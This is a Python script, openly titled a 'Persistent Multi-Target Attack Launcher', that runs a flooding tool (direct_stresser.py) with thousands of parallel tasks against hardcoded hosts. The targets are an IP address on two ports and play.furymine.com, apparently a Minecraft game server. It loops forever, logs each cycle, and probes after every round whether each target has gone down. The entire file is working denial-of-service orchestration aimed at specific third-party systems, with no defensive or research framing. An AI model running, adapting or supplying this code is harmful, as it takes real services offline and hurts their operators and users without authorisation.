#!/usr/bin/env python3
"""
Persistent Multi-Target Attack Launcher
Runs direct floods against all targets in parallel, loops forever.
"""
import subprocess, sys, time, os

TARGETS = [
    ("5.133.100.33", 25600),
    ("5.133.100.33", 25660),
    ("play.furymine.com", 25565),
]
TASKS = 4000
DURATION = 60
SCRIPT = os.path.join(os.path.dirname(__file__), "direct_stresser.py")

procs = []
log_dir = os.path.join(os.path.dirname(__file__), "logs")
os.makedirs(log_dir, exist_ok=True)

print(f"[ATTACK] Launching persistent attack on {len(TARGETS)} targets")
print(f"[ATTACK] {TASKS} tasks x {DURATION}s per cycle, infinite loop")

cycle = 0
while True:
    cycle += 1
    print(f"\n[ATTACK] Cycle {cycle} at {time.strftime('%H:%M:%S')}")
    procs = []
    for ip, port in TARGETS:
        logfile = os.path.join(log_dir, f"attack_{ip}_{port}.log")
        cmd = [sys.executable, SCRIPT, ip, str(port), str(TASKS), str(DURATION), logfile]
        f = open(logfile, "a")
        f.write(f"\n\n=== Cycle {cycle} at {time.strftime('%H:%M:%S')} ===\n")
        f.flush()
        p = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT)
        procs.append((p, ip, port, logfile))
        print(f"[ATTACK] Started {ip}:{port} (PID {p.pid}) -> {logfile}")

    for p, ip, port, logfile in procs:
        p.wait()
        print(f"[ATTACK] {ip}:{port} finished (exit {p.returncode})")

    # quick check if targets are still alive
    for ip, port in TARGETS:
        import socket
        try:
            s = socket.socket(); s.settimeout(2)
            s.connect((ip, port)); s.close()
            print(f"[CHECK] {ip}:{port} STILL ALIVE")
        except:
            print(f"[CHECK] {ip}:{port} DOWN!")

    print(f"[ATTACK] Cycle {cycle} complete, starting next cycle...")
